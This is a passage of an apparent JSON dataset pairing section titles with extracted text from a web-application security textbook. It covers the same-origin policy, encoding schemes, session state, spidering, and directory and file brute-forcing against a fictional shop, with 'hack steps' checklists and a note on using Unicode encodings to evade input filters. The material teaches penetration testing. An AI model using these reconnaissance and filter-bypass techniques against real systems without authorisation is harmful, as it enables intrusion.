interfering\nwith each other. Basically, content received from one website is allowed to read\nand modify other content received from the same site but is not allowed to\naccess content received from other sites.\nIf the same-origin policy did not exist, and an unwitting user browsed to a\nmalicious website, script code running on that site could access the data and\nfunctionality of any other website also visited by the user. This may enable the\nmalicious site to perform funds transfers from the user’s online bank, read his\nor her web mail, or capture credit card details when the user shops online. For\nthis reason, browsers implement restrictions to allow this type of interaction\nonly with content that has been received from the same origin.\nIn practice, applying this concept to the details of different web features and\ntechnologies leads to various complications and compromises. Here are some\nkey features of the same-origin policy that you need to be aware of:\nn A page residing on one domain can cause an arbitrary request to be made\nto another domain (for example, by submitting a form or loading an\nimage). But it cannot itself process the data returned from that request.\nn A page residing on one domain can load a script from another domain and\nexecute this within its own context. This is because scripts are assumed\nto contain code, rather than data, so cross-domain access should not lead\nto disclosure of any sensitive information.\nn A page residing on one domain cannot read or modify the cookies or\nother DOM data belonging to another domain.\nThese features can lead to various cross-domain attacks, such as inducing\nuser actions and capturing data. Further complications arise with browser\nextension technologies, which implement same-origin restrictions in different\nways. These issues are discussed in detail in Chapter 13.\nHTML5\nHTML5 is a major update to the HTML standard. HTML5 currently is still under\ndevelopment and is only partially implemented within browsers.\nFrom a security perspective, HTML5 is primarily of interest for the follow-\ning reasons:\nn It introduces various new tags, attributes, and APIs that can be lever-\naged to deliver cross-site scripting and other attacks, as described in\nChapter 12.\ncc0033..iinndddd 6644 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 65\nChapter 3 n Web Application Technologies 65\nn It modifi es the core Ajax technology, XMLHttpRequest, to enable two-way\ncross-domain interaction in certain situations. This can lead to new cross-\ndomain attacks, as described in Chapter 13.\nn It introduces new mechanisms for client-side data storage, which can lead\nto user privacy issues, and new categories of attack such as client-side SQL\ninjection, as described in Chapter 13.\n“Web 2.0”\nThis buzzword has become fashionable in recent years as a rather loose and\nnebulous name for a range of related trends in web applications, including the\nfollowing:\nn Heavy use of Ajax for performing asynchronous, behind-the-scenes requests\nn Increased cross-domain integration using various techniques\nn Use of new technologies on the client side, including XML, JSON, and Flex\nn More prominent functionality supporting user-generated content, infor-\nmation sharing, and interaction\nAs with all changes in technology, these trends present new opportunities\nfor security vulnerabilities to arise. However, they do not defi ne a clear subset\nof web application security issues in general. The vulnerabilities that occur in\nthese contexts are largely the same as, or closely derived from, types of vulner-\nabilities that preceded these trends. In general, talking about “Web 2.0 Security”\nusually represents a category mistake that does not facilitate clear thinking\nabout the issues that matter.\nBrowser Extension Technologies\nGoing beyond the capabilities of JavaScript, some web applications employ\nbrowser extension technologies that use custom code to extend the browser’s\nbuilt-in capabilities in arbitrary ways. These components may be deployed as\nbytecode that is executed by a suitable browser plug-in or may involve installing\nnative executables onto the client computer itself. The thick-client technologies\nyou are likely to encounter when attacking web applications are\nn Java applets\nn ActiveX controls\nn Flash objects\nn Silverlight objects\nThese technologies are described in detail in Chapter 5.\ncc0033..iinndddd 6655 88//1199//22001111 1122::0033::4455 PPMM"
  },
  {
    "input": "Encoding Schemes",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 66\n66 Chapter 3 n Web Application Technologies\nState and Sessions\nThe technologies described so far enable the server and client components of\na web application to exchange and process data in numerous ways. To imple-\nment most kinds of useful functionality, however, applications need to track the\nstate of each user’s interaction with the application across multiple requests. For\nexample, a shopping application may allow users to browse a product catalog,\nadd items to a cart, view and update the cart contents, proceed to checkout, and\nprovide personal and payment details.\nTo make this kind of functionality possible, the application must maintain a\nset of stateful data generated by the user’s actions across several requests. This\ndata normally is held within a server-side structure called a session. When a\nuser performs an action, such as adding an item to her shopping cart, the server-\nside application updates the relevant details within the user’s session. When the\nuser later views the contents of her cart, data from the session is used to return\nthe correct information to the user.\nIn some applications, state information is stored on the client component\nrather than the server. The current set of data is passed to the client in each\nserver response and is sent back to the server in each client request. Of course,\nbecause the user may modify any data transmitted via the client component,\napplications need to protect themselves from attackers who may change this\nstate information in an attempt to interfere with the application’s logic. The\nASP.NET platform makes use of a hidden form fi eld called ViewState to store\nstate information about the user’s web interface and thereby reduce overhead\non the server. By default, the contents of the ViewState include a keyed hash\nto prevent tampering.\nBecause the HTTP protocol is itself stateless, most applications need a way to\nreidentify individual users across multiple requests for the correct set of state\ndata to be used to process each request. Normally this is achieved by issuing\neach user a token that uniquely identifi es that user’s session. These tokens may\nbe transmitted using any type of request parameter, but most applications use\nHTTP cookies. Several kinds of vulnerabilities arise in relation to session han-\ndling, as described in detail in Chapter 7.\nEncoding Schemes\nWeb applications employ several different encoding schemes for their data. Both\nthe HTTP protocol and the HTML language are historically text-based, and dif-\nferent encoding schemes have been devised to ensure that these mechanisms\ncan safely handle unusual characters and binary data. When you are attacking\na web application, you will frequently need to encode data using a relevant\ncc0033..iinndddd 6666 88//1199//22001111 1122::0033::4466 PPMM"
  },
  {
    "input": "Unicode Encoding",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 67\nChapter 3 n Web Application Technologies 67\nscheme to ensure that it is handled in the way you intend. Furthermore, in many\ncases you may be able to manipulate the encoding schemes an application uses\nto cause behavior that its designers did not intend.\nURL Encoding\nURLs are permitted to contain only the printable characters in the US-ASCII\ncharacter set — that is, those whose ASCII code is in the range 0x20 to 0x7e,\ninclusive. Furthermore, several characters within this range are restricted because\nthey have special meaning within the URL scheme itself or within the HTTP\nprotocol.\nThe URL-encoding scheme is used to encode any problematic characters\nwithin the extended ASCII character set so that they can be safely transported\nover HTTP. The URL-encoded form of any character is the % prefi x followed by\nthe character’s two-digit ASCII code expressed in hexadecimal. Here are some\ncharacters that are commonly URL-encoded:\nn %3d — =\nn %25 — %\nn %20 — Space\nn %0a — New line\nn %00 — Null byte\nA further encoding to be aware of is the + character, which represents a\nURL-encoded space (in addition to the %20 representation of a space).\nNOTE For the purpose of attacking web applications, you should URL-\nencode any of the following characters when you insert them as data into an\nHTTP request:\nspace % ? & = ; + #\n(Of course, you will often need to use these characters with their special\nmeaning when modifying a request — for example, to add a request parameter\nto the query string. In this case, they should be used in their literal form.)\nUnicode Encoding\nUnicode is a character encoding standard that is designed to support all of the\nworld’s writing systems. It employs various encoding schemes, some of which\ncan be used to represent unusual characters in web applications.\n16-bit Unicode encoding works in a similar way to URL encoding. For\ntransmission over HTTP, the 16-bit Unicode-encoded form of a character is\ncc0033..iinndddd 6677 88//1199//22001111 1122::0033::4466 PPMM"
  },
  {
    "input": "HTML Encoding",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 68\n68 Chapter 3 n Web Application Technologies\nthe %u prefi x followed by the character’s Unicode code point expressed in\nhexadecimal:\nn %u2215 — /\nn %u00e9 — é\nUTF-8 is a variable-length encoding standard that employs one or more bytes\nto express each character. For transmission over HTTP, the UTF-8-encoded form\nof a multibyte character simply uses each byte expressed in hexadecimal and\npreceded by the % prefi x:\nn %c2%a9 — ©\nn %e2%89%a0 — (cid:122)\nFor the purpose of attacking web applications, Unicode encoding is primarily\nof interest because it can sometimes be used to defeat input validation mecha-\nnisms. If an input fi lter blocks certain malicious expressions, but the component\nthat subsequently processes the input understands Unicode encoding, it may\nbe possible to bypass the fi lter using various standard and malformed Unicode\nencodings.\nHTML Encoding\nHTML encoding is used to represent problematic characters so that they can be\nsafely incorporated into an HTML document. Various characters have special\nmeaning as metacharacters within HTML and are used to defi ne a document’s\nstructure rather than its content. To use these characters safely as part of the\ndocument’s content, it is necessary to HTML-encode them.\nHTML encoding defi nes numerous HTML entities to represent specifi c literal\ncharacters:\nn &quot; — \"\nn &apos; — '\nn &amp; — &\nn &lt; — <\nn &gt; — >\nIn addition, any character can be HTML-encoded using its ASCII code in deci-\nmal form:\nn &#34; — \"\nn &#39; — '\nor by using its ASCII code in hexadecimal form (prefi xed by an x):\ncc0033..iinndddd 6688 88//1199//22001111 1122::0033::4466 PPMM"
  },
  {
    "input": "Hex Encoding",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 69\nChapter 3 n Web Application Technologies 69\nn &#x22; — \"\nn &#x27; — '\nWhen you are attacking a web application, your main interest in HTML\nencoding is likely to be when probing for cross-site scripting vulnerabilities. If\nan application returns user input unmodifi ed within its responses, it is prob-\nably vulnerable, whereas if dangerous characters are HTML-encoded, it may\nbe safe. See Chapter 12 for more details on these vulnerabilities.\nBase64 Encoding\nBase64 encoding allows any binary data to be safely represented using only\nprintable ASCII characters. It is commonly used to encode e-mail attachments\nfor safe transmission over SMTP. It is also used to encode user credentials in\nbasic HTTP authentication.\nBase64 encoding processes input data in blocks of three bytes. Each of these\nblocks is divided into four chunks of six bits each. Six bits of data allows for 64\ndifferent possible permutations, so each chunk can be represented using a set\nof 64 characters. Base64 encoding employs the following character set, which\ncontains only printable ASCII characters:\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\nIf the fi nal block of input data results in fewer than three chunks of output\ndata, the output is padded with one or two = characters.\nFor example, here is the Base64-encoded form of TheWebApplicationHacker’s\nHandbook:\nVGhlIFdlYiBBcHBsaWNhdGlvbiBIYWNrZXIncyBIYW5kYm9vaw==\nMany web applications use Base64 encoding to transmit binary data within\ncookies and other parameters, and even to obfuscate (that is, to hide) sensitive\ndata to prevent trivial modifi cation. You should always look out for, and decode,\nany Base64 data that is issued to the client. Base64-encoded strings can often\nbe easily recognized by their specifi c character set and the presence of padding\ncharacters at the end of the string.\nHex Encoding\nMany applications use straightforward hexadecimal encoding when transmit-\nting binary data, using ASCII characters to represent the hexadecimal block.\nFor example, hex-encoding the username “daf” within a cookie would result\nin this:\n646166\ncc0033..iinndddd 6699 88//1199//22001111 1122::0033::4466 PPMM"
  },
  {
    "input": "Next Steps",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 70\n70 Chapter 3 n Web Application Technologies\nAs with Base64, hex-encoded data is usually easy to spot. You should always\nattempt to decode any such data that the server sends to the client to understand\nits function.\nRemoting and Serialization Frameworks\nIn recent years, various frameworks have evolved for creating user interfaces in\nwhich client-side code can remotely access various programmatic APIs imple-\nmented on the server side. This allows developers to partly abstract away from\nthe distributed nature of web applications and write code in a manner that is\ncloser to the paradigm of a conventional desktop application. These frameworks\ntypically provide stub APIs for use on the client side. They also automatically\nhandle both the remoting of these API calls to the relevant server-side functions\nand the serialization of any data that is passed to those functions.\nExamples of these kinds of remoting and serialization frameworks include\nthe following:\nn Flex and AMF\nn Silverlight and WCF\nn Java serialized objects\nWe will discuss techniques for working with these frameworks, and the kinds\nof security issues that can arise, in Chapters 4 and 5.\nNext Steps\nSo far, we have described the current state of web application (in)security, exam-\nined the core mechanisms by which web applications can defend themselves,\nand taken a brief look at the key technologies employed in today’s applications.\nWith this groundwork in place, we are now in a position to start looking at the\nactual practicalities of attacking web applications.\nIn any attack, your fi rst task is to map the target application’s content and\nfunctionality to establish how it functions, how it attempts to defend itself, and\nwhat technologies it uses. The next chapter examines this mapping process\nin detail and shows how you can use it to obtain a deep understanding of an\napplication’s attack surface. This knowledge will prove vital when it comes to\nfi nding and exploiting security fl aws within your target.\ncc0033..iinndddd 7700 88//1199//22001111 1122::0033::4466 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 71\nChapter 3 n Web Application Technologies 71\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. What is the OPTIONS method used for?\n2. What are the If-Modified-Since and If-None-Match headers used for?\nWhy might you be interested in these when attacking an application?\n3. What is the signifi cance of the secure fl ag when a server sets a cookie?\n4. What is the difference between the common status codes 301 and 302?\n5. How does a browser interoperate with a web proxy when SSL is being\nused?\ncc0033..iinndddd 7711 88//1199//22001111 1122::0033::4466 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 72\ncc0033..iinndddd 7722 88//1199//22001111 1122::0033::4466 PPMM"
  },
  {
    "input": "Chapter 4 Mapping the Application",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 73\nCHAPTER\n4\nMapping the Application\nThe fi rst step in the process of attacking an application is gathering and examin-\ning some key information about it to gain a better understanding of what you\nare up against.\nThe mapping exercise begins by enumerating the application’s content and\nfunctionality in order to understand what the application does and how it\nbehaves. Much of this functionality is easy to identify, but some of it may be\nhidden, requiring a degree of guesswork and luck to discover.\nAfter a catalog of the application’s functionality has been assembled, the\nprincipal task is to closely examine every aspect of its behavior, its core secu-\nrity mechanisms, and the technologies being employed (on both the client and\nserver). This will enable you to identify the key attack surface that the application\nexposes and hence the most interesting areas where you should target subse-\nquent probing to fi nd exploitable vulnerabilities. Often the analysis exercise can\nuncover vulnerabilities by itself, as discussed later in the chapter.\nAs applications get ever larger and more functional, effective mapping is a\nvaluable skill. A seasoned expert can quickly triage whole areas of functionality,\nlooking for classes of vulnerabilities as opposed to instances, while investing\nsignifi cant time in testing other specifi c areas, aiming to uncover a high-risk issue.\nThis chapter describes the practical steps you need to follow during application\nmapping, various techniques and tricks you can use to maximize its effective-\nness, and some tools that can assist you in the process.\n73\ncc0044..iinndddd 7733 88//1199//22001111 1122::0044::4400 PPMM"
  },
  {
    "input": "Web Spidering",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 74\n74 Chapter 4 n Mapping the Application\nEnumerating Content and Functionality\nIn a typical application, the majority of the content and functionality can be\nidentifi ed via manual browsing. The basic approach is to walk through the\napplication starting from the main initial page, following every link, and navi-\ngating through all multistage functions (such as user registration or password\nresetting). If the application contains a “site map,” this can provide a useful\nstarting point for enumerating content.\nHowever, to perform a rigorous inspection of the enumerated content, and\nto obtain a comprehensive record of everything identifi ed, you must employ\nmore advanced techniques than simple browsing.\nWeb Spidering\nVarious tools can perform automated spidering of websites. These tools work\nby requesting a web page, parsing it for links to other content, requesting these\nlinks, and continuing recursively until no new content is discovered.\nBuilding on this basic function, web application spiders attempt to achieve\na higher level of coverage by also parsing HTML forms and submitting these\nback to the application using various preset or random values. This can enable\nthem to walk through multistage functionality and to follow forms-based navi-\ngation (such as where drop-down lists are used as content menus). Some tools\nalso parse client-side JavaScript to extract URLs pointing to further content.\nNumerous free tools are available that do a decent job of enumerating applica-\ntion content and functionality, including Burp Suite, WebScarab, Zed Attack\nProxy, and CAT (see Chapter 20 for more details).\nTIP Many web servers contain a fi le named robots.txt in the web root that\ncontains a list of URLs that the site does not want web spiders to visit or search\nengines to index. Sometimes, this fi le contains references to sensitive func-\ntionality, which you are certainly interested in spidering. Some spidering tools\ndesigned for attacking web applications check for the robots.txt fi le and use\nall URLs within it as seeds in the spidering process. In this case, the robots.txt\nfi le may be counterproductive to the security of the web application.\nThis chapter uses a fi ctional application, Extreme Internet Shopping (EIS), to\nprovide examples of common application mapping actions. Figure 4-1 shows\nBurp Spider running against EIS. Without logging on, it is possible to map out the\n/shop directory and two news articles in the /media directory. Also note that\nthe robots.txt fi le shown in the fi gure references the directories /mdsecportal\nand /site-old. These are not linked from anywhere in the application and would\nnot be indexed by a web spider that only followed links from published content.\nTIP Applications that employ REST-style URLs use portions of the URL fi le\npath to uniquely identify data and other resources used within the application\ncc0044..iinndddd 7744 88//1199//22001111 1122::0044::4411 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 75\nChapter 4 n Mapping the Application 75\n(see Chapter 3 for more details). The traditional web spider’s URL-based view\nof the application is useful in these situations. In the EIS application, the\n/shop and /pub paths employ REST-style URLs, and spidering these areas eas-\nily provides unique links to the items available within these paths.\nFigure 4-1: Mapping part of an application using Burp Spider\nAlthough it can often be effective, this kind of fully automated approach to\ncontent enumeration has some signifi cant limitations:\nn Unusual navigation mechanisms (such as menus dynamically created\nand handled using complicated JavaScript code) often are not handled\nproperly by these tools, so they may miss whole areas of an application.\nn Links buried within compiled client-side objects such as Flash or Java\napplets may not be picked up by a spider.\nn Multistage functionality often implements fi ne-grained input validation\nchecks, which do not accept the values that may be submitted by an auto-\nmated tool. For example, a user registration form may contain fi elds for\nname, e-mail address, telephone number, and zip code. An automated\ncc0044..iinndddd 7755 88//1199//22001111 1122::0044::4411 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 76\n76 Chapter 4 n Mapping the Application\napplication spider typically submits a single test string in each editable\nform fi eld, and the application returns an error message saying that one\nor more of the items submitted were invalid. Because the spider is not\nintelligent enough to understand and act on this message, it does not\nproceed past the registration form and therefore does not discover any\nmore content or functions accessible beyond it.\nn Automated spiders typically use URLs as identifi ers of unique content.\nTo avoid continuing spidering indefi nitely, they recognize when linked\ncontent has already been requested and do not request it again. However,\nmany applications use forms-based navigation in which the same URL\nmay return very different content and functions. For example, a bank-\ning application may implement every user action via a POST request to\n/account.jsp and use parameters to communicate the action being per-\nformed. If a spider refuses to make multiple requests to this URL, it will\nmiss most of the application’s content. Some application spiders attempt\nto handle this situation. For example, Burp Spider can be confi gured to\nindividuate form submissions based on parameter names and values.\nHowever, there may still be situations where a fully automated approach\nis not completely effective. We discuss approaches to mapping this kind\nof functionality later in this chapter.\nn Conversely to the previous point, some applications place volatile data\nwithin URLs that is not actually used to identify resources or functions (for\nexample, parameters containing timers or random number seeds). Each\npage of the application may contain what appears to be a new set of URLs\nthat the spider must request, causing it to continue running indefi nitely.\nn Where an application uses authentication, an effective application spider\nmust be able to handle this to access the functionality that the authen-\ntication protects. The spiders mentioned previously can achieve this by\nmanually confi guring the spider either with a token for an authenticated\nsession or with credentials to submit to the login function. However, even\nwhen this is done, it is common to fi nd that the spider’s operation breaks\nthe authenticated session for various reasons:\nn By following all URLs, at some point the spider will request the logout\nfunction, causing its session to break.\nn If the spider submits invalid input to a sensitive function, the applica-\ntion may defensively terminate the session.\nn If the application uses per-page tokens, the spider almost certainly will\nfail to handle these properly by requesting pages out of their expected\nsequence, probably causing the entire session to be terminated.\ncc0044..iinndddd 7766 88//1199//22001111 1122::0044::4411 PPMM"
  },
  {
    "input": "User-Directed Spidering",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 77\nChapter 4 n Mapping the Application 77\nWARNING In some applications, running even a simple web spider that\nparses and requests links can be extremely dangerous. For example, an applica-\ntion may contain administrative functionality that deletes users, shuts down a\ndatabase, restarts the server, and the like. If an application-aware spider is used,\ngreat damage can be done if the spider discovers and uses sensitive functional-\nity. The authors have encountered an application that included some Content\nManagement System (CMS) functionality for editing the content of the main\napplication. This functionality could be discovered via the site map and was not\nprotected by any access control. If an automated spider were run against this\nsite, it would fi nd the edit function and begin sending arbitrary data, resulting in\nthe main website’s being defaced in real time while the spider was running.\nUser-Directed Spidering\nThis is a more sophisticated and controlled technique that is usually prefer-\nable to automated spidering. Here, the user walks through the application in\nthe normal way using a standard browser, attempting to navigate through all\nthe application’s functionality. As he does so, the resulting traffi c is passed\nthrough a tool combining an intercepting proxy and spider, which monitors\nall requests and responses. The tool builds a map of the application, incorpo-\nrating all the URLs visited by the browser. It also parses all the application’s\nresponses in the same way as a normal application-aware spider and updates\nthe site map with the content and functionality it discovers. The spiders\nwithin Burp Suite and WebScarab can be used in this way (see Chapter 20\nfor more information).\nCompared with the basic spidering approach, this technique offers numer-\nous benefi ts:\nn Where the application uses unusual or complex mechanisms for navigation,\nthe user can follow these using a browser in the normal way. Any functions\nand content accessed by the user are processed by the proxy/spider tool.\nn The user controls all data submitted to the application and can ensure\nthat data validation requirements are met.\nn The user can log in to the application in the usual way and ensure that the\nauthenticated session remains active throughout the mapping process. If\nany action performed results in session termination, the user can log in\nagain and continue browsing.\nn Any dangerous functionality, such as deleteUser.jsp, is fully enumer-\nated and incorporated into the proxy’s site map, because links to it will be\nparsed out of the application’s responses. But the user can use discretion\nin deciding which functions to actually request or carry out.\ncc0044..iinndddd 7777 88//1199//22001111 1122::0044::4411 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 78\n78 Chapter 4 n Mapping the Application\nIn the Extreme Internet Shopping site, previously it was impossible for the\nspider to index any content within /home, because this content is authenticated.\nRequests to /home result in this response:\nHTTP/1.1 302 Moved Temporarily\nDate: Mon, 24 Jan 2011 16:13:12 GMT\nServer: Apache\nLocation: /auth/Login?ReturnURL=/home/\nWith user-directed spidering, the user can simply log in to the application\nusing her browser, and the proxy/spider tool picks up the resulting session and\nidentifi es all the additional content now available to the user. Figure 4-2 shows\nthe EIS site map when the user has successfully authenticated to the protected\nareas of the application.\nFigure 4-2: Burp’s site map after user-guided spidering has been performed\nThis reveals some additional resources within the home menu system. The\nfi gure shows a reference to a private profi le that is accessed through a JavaScript\nfunction launched with the onClick event handler:\n<a href=”#” onclick=”ui_nav(‘profile’)”>private profile</a>\ncc0044..iinndddd 7788 88//1199//22001111 1122::0044::4411 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 79\nChapter 4 n Mapping the Application 79\nA conventional web spider that simply follows links within HTML is likely to\nmiss this type of link. Even the most advanced automated application crawlers\nlag way behind the numerous navigational mechanisms employed by today’s\napplications and browser extensions. With user-directed spidering, however,\nthe user simply needs to follow the visible on-screen link using her browser,\nand the proxy/spider tool adds the resulting content to the site map.\nConversely, note that the spider has successfully identifi ed the link to /core/\nsitestats contained in an HTML comment, even though this link is not shown\non-screen to the user.\nTIP In addition to the proxy/spider tools just described, another range\nof tools that are often useful during application mapping are the various\nbrowser extensions that can perform HTTP and HTML analysis from within the\nbrowser interface. For example, the IEWatch tool shown in Figure 4-3, which\nruns within Microsoft Internet Explorer, monitors all details of requests and\nresponses, including headers, request parameters, and cookies. It analyzes\nevery application page to display links, scripts, forms, and thick-client compo-\nnents. Of course, all this information can be viewed in your intercepting proxy,\nbut having a second record of useful mapping data can only help you better\nunderstand the application and enumerate all its functionality. See Chapter 20\nfor more information about tools of this kind.\nFigure 4-3: IEWatch performing HTTP and HTML analysis from within the browser\ncc0044..iinndddd 7799 88//1199//22001111 1122::0044::4422 PPMM"
  },
  {
    "input": "Discovering Hidden Content",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 80\n80 Chapter 4 n Mapping the Application\nHACK STEPS\n1. Configure your browser to use either Burp or WebScarab as a local proxy\n(see Chapter 20 for specific details about how to do this if you’re unsure).\n2. Browse the entire application normally, attempting to visit every link/URL\nyou discover, submitting every form, and proceeding through all multi-\nstep functions to completion. Try browsing with JavaScript enabled and\ndisabled, and with cookies enabled and disabled. Many applications can\nhandle various browser configurations, and you may reach different con-\ntent and code paths within the application.\n3. Review the site map generated by the proxy/spider tool, and identify\nany application content or functions that you did not browse manually.\nEstablish how the spider enumerated each item. For example, in Burp\nSpider, check the Linked From details. Using your browser, access the item\nmanually so that the response from the server is parsed by the proxy/spi-\nder tool to identify any further content. Continue this step recursively until\nno further content or functionality is identified.\n4. Optionally, tell the tool to actively spider the site using all of the already\nenumerated content as a starting point. To do this, first identify any URLs\nthat are dangerous or likely to break the application session, and config-\nure the spider to exclude these from its scope. Run the spider and review\nthe results for any additional content it discovers.\nThe site map generated by the proxy/spider tool contains a wealth of infor-\nmation about the target application, which will be useful later in identifying\nthe various attack surfaces exposed by the application.\nDiscovering Hidden Content\nIt is common for applications to contain content and functionality that is not\ndirectly linked to or reachable from the main visible content. A common example\nis functionality that has been implemented for testing or debugging purposes\nand has never been removed.\nAnother example arises when the application presents different functionality\nto different categories of users (for example, anonymous users, authenticated\nregular users, and administrators). Users at one privilege level who perform\nexhaustive spidering of the application may miss functionality that is visible to\nusers at other levels. An attacker who discovers the functionality may be able\nto exploit it to elevate her privileges within the application.\nThere are countless other cases in which interesting content and functionality\nmay exist that the mapping techniques previously described would not identify:\nn Backup copies of live fi les. In the case of dynamic pages, their fi le extension\nmay have changed to one that is not mapped as executable, enabling you\ncc0044..iinndddd 8800 88//1199//22001111 1122::0044::4422 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 81\nChapter 4 n Mapping the Application 81\nto review the page source for vulnerabilities that can then be exploited\non the live page.\nn Backup archives that contain a full snapshot of fi les within (or indeed\noutside) the web root, possibly enabling you to easily identify all content\nand functionality within the application.\nn New functionality that has been deployed to the server for testing but not\nyet linked from the main application.\nn Default application functionality in an off-the-shelf application that has\nbeen superfi cially hidden from the user but is still present on the server.\nn Old versions of fi les that have not been removed from the server. In the\ncase of dynamic pages, these may contain vulnerabilities that have been\nfi xed in the current version but that can still be exploited in the old version.\nn Confi guration and include fi les containing sensitive data such as database\ncredentials.\nn Source fi les from which the live application’s functionality has been\ncompiled.\nn Comments in source code that in extreme cases may contain information\nsuch as usernames and passwords but that more likely provide information\nabout the state of the application. Key phrases such as “test this function”\nor something similar are strong indicators of where to start hunting for\nvulnerabilities.\nn Log fi les that may contain sensitive information such as valid usernames,\nsession tokens, URLs visited, and actions performed.\nEffective discovery of hidden content requires a combination of automated and\nmanual techniques and often relies on a degree of luck.\nBrute-Force Techniques\nChapter 14 describes how automated techniques can be leveraged to speed up\njust about any attack against an application. In the present context of informa-\ntion gathering, automation can be used to make huge numbers of requests to the\nweb server, attempting to guess the names or identifi ers of hidden functionality.\nFor example, suppose that your user-directed spidering has identifi ed the\nfollowing application content:\nhttp://eis/auth/Login\nhttp://eis/auth/ForgotPassword\nhttp://eis/home/\nhttp://eis/pub/media/100/view\nhttp://eis/images/eis.gif\nhttp://eis/include/eis.css\ncc0044..iinndddd 8811 88//1199//22001111 1122::0044::4422 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 82\n82 Chapter 4 n Mapping the Application\nThe fi rst step in an automated effort to identify hidden content might involve\nthe following requests, to locate additional directories:\nhttp://eis/About/\nhttp://eis/abstract/\nhttp://eis/academics/\nhttp://eis/accessibility/\nhttp://eis/accounts/\nhttp://eis/action/\n...\nBurp Intruder can be used to iterate through a list of common directory\nnames and capture details of the server’s responses, which can be reviewed to\nidentify valid directories. Figure 4-4 shows Burp Intruder being confi gured to\nprobe for common directories residing at the web root.\nFigure 4-4: Burp Intruder being configured to probe for common directories\nWhen the attack has been executed, clicking column headers such as “status”\nand “length” sorts the results accordingly, enabling you to quickly identify a\nlist of potential further resources, as shown in Figure 4-5.\nHaving brute-forced for directories and subdirectories, you may then want\nto fi nd additional pages in the application. Of particular interest is the /auth\ndirectory containing the Login resource identifi ed during the spidering pro-\ncess, which is likely to be a good starting point for an unauthenticated attacker.\nAgain, you can request a series of fi les within this directory:\ncc0044..iinndddd 8822 88//1199//22001111 1122::0044::4422 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 83\nChapter 4 n Mapping the Application 83\nhttp://eis/auth/About/\nhttp://eis/auth/Aboutus/\nhttp://eis/auth/AddUser/\nhttp://eis/auth/Admin/\nhttp://eis/auth/Administration/\nhttp://eis/auth/Admins/\n...\nFigure 4-5: Burp Intruder showing the results of a directory brute-force attack\nFigure 4-6 shows the results of this attack, which has identifi ed several resources\nwithin the /auth directory:\nLogin\nLogout\nRegister\nProfile\nNote that the request for Profile returns the HTTP status code 302. This\nindicates that accessing this link without authentication redirects the user to\nthe login page. Of further interest is that although the Login page was discov-\nered during spidering, the Register page was not. It could be that this extra\nfunctionality is operational, and an attacker could register a user account on\nthe site.\ncc0044..iinndddd 8833 88//1199//22001111 1122::0044::4422 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 84\n84 Chapter 4 n Mapping the Application\nFigure 4-6: Burp Intruder showing the results of a file brute-force attack\nNOTE Do not assume that the application will respond with 200 OK if a\nrequested resource exists and 404 Not Found if it does not. Many applica-\ntions handle requests for nonexistent resources in a customized way, often\nreturning a bespoke error message and a 200 response code. Furthermore,\nsome requests for existent resources may receive a non-200 response. The fol-\nlowing is a rough guide to the likely meaning of the response codes that you\nmay encounter during a brute-force exercise looking for hidden content:\nn 302 Found — If the redirect is to a login page, the resource may be\naccessible only by authenticated users. If the redirect is to an error mes-\nsage, this may indicate a different reason. If it is to another location, the\nredirect may be part of the application’s intended logic, and this should\nbe investigated further.\nn 400 Bad Request — The application may use a custom naming scheme\nfor directories and fi les within URLs, which a particular request has not\ncomplied with. More likely, however, is that the wordlist you are using\ncontains some whitespace characters or other invalid syntax.\nn 401 Unauthorized or 403 Forbidden — This usually indicates that\nthe requested resource exists but may not be accessed by any user,\ncc0044..iinndddd 8844 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 85\nChapter 4 n Mapping the Application 85\nregardless of authentication status or privilege level. It often occurs when\ndirectories are requested, and you may infer that the directory exists.\nn 500 Internal Server Error — During content discovery, this usually\nindicates that the application expects certain parameters to be submitted\nwhen requesting the resource.\nThe various possible responses that may indicate the presence of interesting\ncontent mean that is diffi cult to write a fully automated script to output a list-\ning of valid resources. The best approach is to capture as much information as\npossible about the application’s responses during the brute-force exercise and\nmanually review it.\nHACK STEPS\n1. Make some manual requests for known valid and invalid resources, and\nidentify how the server handles the latter.\n2. Use the site map generated through user-directed spidering as a basis for\nautomated discovery of hidden content.\n3. Make automated requests for common filenames and directories within\neach directory or path known to exist within the application. Use Burp\nIntruder or a custom script, together with wordlists of common files and\ndirectories, to quickly generate large numbers of requests. If you have iden-\ntified a particular way in which the application handles requests for invalid\nresources (such as a customized “file not found” page), configure Intruder\nor your script to highlight these results so that they can be ignored.\n4. Capture the responses received from the server, and manually review\nthem to identify valid resources.\n5. Perform the exercise recursively as new content is discovered.\nInference from Published Content\nMost applications employ some kind of naming scheme for their content and\nfunctionality. By inferring from the resources already identifi ed within the\napplication, it is possible to fi ne-tune your automated enumeration exercise to\nincrease the likelihood of discovering further hidden content.\nIn the EIS application, note that all resources in /auth start with a capital letter.\nThis is why the wordlist used in the fi le brute forcing in the previous section\nwas deliberately capitalized. Furthermore, since we have already identifi ed a\npage called ForgotPassword in the /auth directory, we can search for similarly\nnamed items, such as the following:\nhttp://eis/auth/ResetPassword\ncc0044..iinndddd 8855 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 86\n86 Chapter 4 n Mapping the Application\nAdditionally, the site map created during user-directed spidering identifi ed\nthese 